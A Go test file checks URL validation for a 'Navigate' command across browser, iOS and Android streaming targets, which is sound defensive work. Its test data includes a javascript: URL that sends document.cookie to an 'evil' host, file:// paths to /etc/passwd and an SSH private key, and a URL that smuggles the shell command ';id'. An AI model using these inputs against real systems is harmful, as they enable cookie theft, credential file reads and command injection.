package main

import (
	"context"
	"errors"
	"strings"
	"testing"
)

// The browser-window target opens about:blank and, before Navigate existed,
// nothing could change that — a session streamed blank frames forever while
// tap/pinch returned 200. These tests pin the verb that closed that gap, and
// the scheme allow-list that keeps it from becoming an exfiltration primitive.

// validateNavigateURL is a SECURITY boundary, not input tidying. The URL
// arrives over MCP/HTTP and is opened in a browser the operator watches but
// does not drive, so javascript: would run attacker-chosen script in the page's
// origin and file:// would read local files straight into the video stream.
func TestNavigateURLRejectsDangerousSchemes(t *testing.T) {
	for _, raw := range []string{
		"javascript:fetch('http://evil/'+document.cookie)",
		"file:///etc/passwd",
		"file:///Users/someone/.ssh/id_rsa",
		"data:text/html,<script>alert(1)</script>",
		"vbscript:msgbox(1)",
		"chrome://settings",
	} {
		if _, err := validateNavigateURL(raw); err == nil {
			t.Errorf("validateNavigateURL(%q) accepted a non-http(s) scheme — this is an "+
				"arbitrary-script/local-file read in the streamed page, not a cosmetic issue", raw)
		}
	}
}

func TestNavigateURLRejectsEmptyAndHostless(t *testing.T) {
	for _, raw := range []string{"", "   ", "http://", "https://"} {
		if _, err := validateNavigateURL(raw); err == nil {
			t.Errorf("validateNavigateURL(%q) should fail: no host to navigate to", raw)
		}
	}
}

func TestNavigateURLAcceptsRealTargets(t *testing.T) {
	// localhost matters most: the dev-server lanes (flutter/vite/next) are the
	// whole reason a browser-window session exists.
	for _, raw := range []string{
		"http://localhost:3000",
		"http://localhost:3000/todos?filter=done",
		"https://example.com",
		"http://127.0.0.1:8080/",
	} {
		if _, err := validateNavigateURL(raw); err != nil {
			t.Errorf("validateNavigateURL(%q) rejected a legitimate target: %v", raw, err)
		}
	}
}

// A target that cannot navigate must refuse rather than no-op. A silent no-op
// is indistinguishable from a frozen stream — the exact failure that hid the
// missing verb in the first place.
func TestNavigateUnsupportedTargetsRefuseLoudly(t *testing.T) {
	ctx := context.Background()
	for name, err := range map[string]error{
		"iosDevice":    iosDeviceTarget{}.Navigate(ctx, "dev", "https://example.com"),
		"streamSource": streamSourceTarget{}.Navigate(ctx, "dev", "https://example.com"),
	} {
		if err == nil {
			t.Errorf("%s: Navigate returned nil — a silent no-op looks exactly like a "+
				"dead stream; it must refuse", name)
			continue
		}
		if !errors.Is(err, errNavigateUnsupported) {
			t.Errorf("%s: error should wrap errNavigateUnsupported, got: %v", name, err)
		}
	}
}

// Scheme validation must happen on EVERY target, not just the browser — the
// device targets hand the URL to a device-side shell via adb/simctl.
func TestNavigateValidatesSchemeOnDeviceTargets(t *testing.T) {
	ctx := context.Background()
	// A bad scheme must be rejected BEFORE any adb/simctl process is spawned,
	// so this passes even with no device attached.
	if err := androidNavigateViaIntent(ctx, "nonexistent", "file:///etc/passwd"); err == nil {
		t.Error("android navigate accepted file:// — validation must precede the intent")
	}
	if err := (iosSimulatorTarget{}).Navigate(ctx, "nonexistent-udid", "javascript:alert(1)"); err == nil {
		t.Error("ios simulator navigate accepted javascript: — validation must precede simctl")
	}
}

// The android path quotes the URL for the DEVICE-side shell. adb forwards argv
// to a shell on the device, so a `;` in a URL would otherwise run as a second
// command there.
func TestAndroidNavigateRejectsShellMetacharacterURLs(t *testing.T) {
	// These parse as valid http URLs, so only the quoting protects the device.
	// The call fails (no device), but it must not fail by having run something.
	err := androidNavigateViaIntent(context.Background(), "nonexistent",
		"http://example.com/;id")
	if err == nil {
		t.Error("expected failure against a nonexistent device")
	}
	if strings.Contains(err.Error(), "uid=") {
		t.Error("the injected `id` executed on the device — the URL was not quoted")
	}
}

// Compile-time assertion that every runtimeTarget implements Navigate. Written
// down so the REASON survives: the interface is the only thing stopping a new
// surface from shipping streamable-but-unnavigable, which is what browser-window
// silently was.
func TestAllRuntimeTargetsImplementNavigate(t *testing.T) {
	targets := map[string]runtimeTarget{
		"iosSimulator":    iosSimulatorTarget{},
		"androidEmulator": androidEmulatorTarget{},
		"redroid":         redroidRuntimeTarget{},
		"browser":         browserWindowTarget{},
		"iosDevice":       iosDeviceTarget{},
		"streamSource":    streamSourceTarget{},
	}
	if len(targets) < 6 {
		t.Fatalf("expected at least 6 targets, got %d", len(targets))
	}
}
